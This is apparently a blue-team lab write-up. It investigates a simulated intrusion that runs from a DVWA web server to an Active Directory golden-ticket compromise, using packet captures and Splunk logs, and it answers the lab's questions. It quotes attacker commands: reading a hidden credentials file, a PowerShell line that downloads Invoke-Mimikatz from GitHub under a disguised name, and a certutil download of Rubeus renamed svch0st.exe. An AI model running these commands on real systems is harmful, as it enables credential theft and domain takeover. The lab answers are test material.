<h1 align="center">Domainnance – Incident Response Investigation</h1>
<h3 align="center">Blue Team Labs Online | Network & Host-Based Analysis</h3>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/93e25750-2a69-49b9-b4c9-fb20bcc2c8d7" />

---

### 🧪 Scenario

A recently formed company working with a mid-scale workforce claimed to have a secure environment. Taking this as a challenge, a 13-year-old kid attempted to gain access to their environment and succeeded. You are onboarded based on your Incident Response skills to investigate the incident.

<p>
Source:
<a href="https://blueteamlabs.online/home/investigation/domainnance-befa8a1fd4" target="_blank">
Blue Team Labs Online – Domainnance
</a>
</p>

---

### 📂 Provided Files

- **Troubleshooting-Splunk.pdf** – used to help spin up the Splunk service  
- **Packet capture file** of the incident  

After starting the Splunk process, it was observed running on the loopback address (`127.0.0.1`) on port `8000`.
<img width="2856" height="1508" alt="image" src="https://github.com/user-attachments/assets/d4d864cc-9295-4e8e-9482-86288f748ad8" />

---

### ❓ Q1) The attacker tried logging into the vulnerable webserver. Can you find the correct credentials?

Before investigating logs, I performed a data summary in Splunk to understand what sources were ingested. The environment contained Windows Event Logs and Sysmon logs.

<img width="1719" height="692" alt="image" src="https://github.com/user-attachments/assets/25cdc731-6751-419b-a0a4-eae419b89b67" />


I then analyzed the packet capture in Wireshark and filtered traffic going to port 80:

tcp.port == 80

<img width="2823" height="1256" alt="image" src="https://github.com/user-attachments/assets/caa24203-abc7-4f02-b291-0c0302bab298" />


Multiple requests were sent to `192.168.1.12`. Following the TCP stream revealed the DVWA login page hosted on the webserver. The attacker logged in using default credentials:

admin : password

<img width="2870" height="1398" alt="image" src="https://github.com/user-attachments/assets/fa136340-d15d-4b66-8d24-f70478606530" />


This was a clear misconfiguration.

### ❓ Q2) What is the IP of the attacker machine while interacting with the webserver?

The attacker’s IP address while interacting with the webserver was:

192.168.1.13

<img width="2823" height="1256" alt="image" src="https://github.com/user-attachments/assets/a9ea4281-b827-4dd0-bab7-35ad91793224" />


### ❓ Q3) The attacker was able to execute commands on the webserver. How many commands were executed?

**Answer:** 6  

This was determined by reviewing POST requests sent to the webserver ( POST /dvwa/vulnerabilities/exec/ ). It seemed like the attacker tried to upload some commands in through an upload field in the webserver.

<img width="2877" height="1235" alt="image" src="https://github.com/user-attachments/assets/3a49262c-28dc-41d3-a0a5-ca15db97bf02" />

### ❓ Q4) The attacker found a useful file on the webserver. What is the name of the file?
For this one by analyzing all those post request we found that the attacker gained a foothold and began listing hidden files in `/var/www/dvwa/`.Then he found .credentials.txt and tried to open it with:
cat /var/www/dvwa/.credentials.txt

<img width="2796" height="1331" alt="image" src="https://github.com/user-attachments/assets/30081a26-ef6e-4396-a98e-6994252e636c" />


### ❓ Q5) What important data is present inside the file?

Following the TCP stream showed the sensitive data returned in the webserver response.

<img width="2871" height="1515" alt="image" src="https://github.com/user-attachments/assets/9f107b79-c4f2-4d07-a0d3-5bd0694b966a" />

### ❓ Q6) What internal network subnet did the attacker discover and scan?

Using the filter:
Looking at the last POST request in the conversatons(
ip.dst == 192.168.1.12 && ip.src == 192.168.1.13) we can see the nmap scan to the subnet.
The scan targeted:

10.0.2.0/24

<img width="2867" height="1395" alt="image" src="https://github.com/user-attachments/assets/cbab008f-2d86-46f0-a465-0a9ce03c939a" />


### ❓ Q7) Using Splunk, what is the domain name of the AD environment?

Starting with a broad search:
index=*

<img width="2849" height="1277" alt="image" src="https://github.com/user-attachments/assets/5769b83f-e066-4cae-9057-c81622cf360c" />


Reviewing the **account domain** field revealed the Active Directory domain name.

<img width="2868" height="1526" alt="image" src="https://github.com/user-attachments/assets/0abac505-14dc-4a08-a4f3-1b3abfe4971e" />


### ❓ Q8) A user account “mtyson” downloaded files onto one of the systems. What system was it?
Looking into the user account "mtyson", we observed two computer used by this account
<img width="2859" height="1122" alt="image" src="https://github.com/user-attachments/assets/9e71cf73-5bcf-4c21-8de2-1d8f32902d5b" />

PowerShell activity was observed on the second system. The first system only showed system login events.

<img width="2837" height="1166" alt="image" src="https://github.com/user-attachments/assets/2e1b4582-af9f-40ef-bff6-283e26dc8193" />

<img width="2840" height="1161" alt="image" src="https://github.com/user-attachments/assets/ed306bd8-2b81-4a46-b90e-18ddb0f38bb8" />

### ❓ Q9) What is the first file downloaded onto the system?  
**(Format: ActualName, GivenName)**
I looked into sysmon logs with the computer name and the hostname and found a process creation Sysmon Event ID 1 that showed PowerShell executing:

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Troubleshoot.ps1

<img width="2870" height="1130" alt="image" src="https://github.com/user-attachments/assets/2c64e9f8-4f02-46b1-872b-0e82fb6eebe4" />


**Answer:**
Invoke-Mimikatz.ps1, Troubleshoot.ps1

### ❓ Q10) What one-liner command was used to dump credentials?

For that one I used the search query: 

<img width="2852" height="522" alt="image" src="https://github.com/user-attachments/assets/3d92cef4-a542-49eb-ace5-b0639dc0ff5e" />


Reviewing commands executed from `Troubleshoot.ps1` revealed the credential-dumping command.

<img width="2850" height="1185" alt="image" src="https://github.com/user-attachments/assets/1d4e35f7-1eca-47d0-b3a6-760909dd8a34" />


### ❓ Q11) The attacker downloaded a compiled binary under a legitimate-looking name. What was it saved as?
Using the same search, I looked into the commandline to see any file other than msedge or maybe powershell that call out to download a file and rename it and I found that `certutil.exe` was used to download **rubeus.exe**, which was renamed to:

svch0st.exe

<img width="2864" height="1409" alt="image" src="https://github.com/user-attachments/assets/4953206f-d80f-47b1-9209-1f0968348474" />

### ❓ Q12) What ticket was used for the pass-the-ticket attack?

0-60a10000-mtyson@krbtgt~HIGHLYSECURED.TECH-HIGHLYSECURED.TECH.kirbi

We can see the ptt which stands for pass the ticket.

<img width="2084" height="843" alt="image" src="https://github.com/user-attachments/assets/97757b8d-d8a4-4217-b50f-37c59f5b45b7" />


### ❓ Q13) What technique was used to achieve domain-wide compromise?
We can see that the attacker performed a **Golden Ticket** attack.

(Command is in the last screenshot)

### ❓ Q14) What command was used to perform the attack?

The command was identified from the logs, right next to the first ptt attack.

<img width="2813" height="732" alt="image" src="https://github.com/user-attachments/assets/34156394-fc7d-4e8c-888a-d5c4ff4c2269" />


### 🏁 Conclusion

This investigation demonstrated a full attack chain, from web exploitation to domain-wide compromise, highlighting the importance of proper configuration, monitoring, and incident response.

Thanks for reading.
